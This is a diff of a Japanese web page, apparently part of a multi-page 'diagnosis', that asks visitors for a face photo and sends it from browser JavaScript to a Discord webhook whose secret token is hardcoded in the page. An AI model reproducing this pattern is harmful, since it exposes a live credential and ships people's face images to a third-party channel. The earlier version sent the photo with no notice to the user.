@@ -1,48 +1,62 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <title>診断ページ２ - 顔写真アップロード</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>顔写真をアップロード</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="container">
-    <h2>あなたの顔写真をアップロードしてください</h2>
-    <input type="file" id="upload" accept="image/*">
-    <button id="sendButton">次に進む</button>
+    <h1>顔写真をアップロード</h1>
+    <form id="photoForm">
+      <input type="file" id="photoInput" accept="image/*" required />
+      <button type="submit" id="submitButton" disabled>送信</button>
+    </form>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1379749797371580437/smRAKks4G35vKArSlqAlVf3N_m8sDVDznuW7oI5gVB6xzJ8-HN32TKxuGTAT1pxYj65G";
+    const webhookURL = "https://discord.com/api/webhooks/1379749797371580437/smRAKks4G35vKArSlqAlVf3N_m8sDVDznuW7oI5gVB6xzJ8-HN32TKxuGTAT1pxYj65G"; // ← あなたのWebhookに置き換えてください
+    const form = document.getElementById("photoForm");
+    const fileInput = document.getElementById("photoInput");
+    const submitButton = document.getElementById("submitButton");
 
-    document.getElementById("sendButton").addEventListener("click", function () {
-      const fileInput = document.getElementById("upload");
+    // ファイルが選択されたらボタン有効化
+    fileInput.addEventListener("change", () => {
+      submitButton.disabled = !fileInput.files.length;
+    });
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      submitButton.disabled = true;
+
       const file = fileInput.files[0];
-
-      if (!file) {
-        alert("画像を選んでください！");
-        return;
-      }
+      const fixedMessage = "顔の写真が送信されました";
 
       const formData = new FormData();
       formData.append("file", file);
+      formData.append("payload_json", JSON.stringify({
+        content: fixedMessage
+      }));
 
-      fetch(webhookURL, {
-        method: "POST",
-        body: formData
-      })
-      .then((response) => {
+      try {
+        const response = await fetch(webhookURL, {
+          method: "POST",
+          body: formData
+        });
+
         if (response.ok) {
-          window.location.href = "page3.html";  // 送信成功で次へ
+          alert("顔の写真をDiscordに送信しました！");
+          window.location.href = "page3.html"; // 次のページへ
         } else {
           alert("送信に失敗しました。");
         }
-      })
-      .catch((error) => {
-        console.error("エラー:", error);
+      } catch (error) {
+        console.error("送信エラー:", error);
         alert("送信中にエラーが発生しました。");
-      });
+      } finally {
+        submitButton.disabled = false;
+      }
     });
   </script>
 </body>
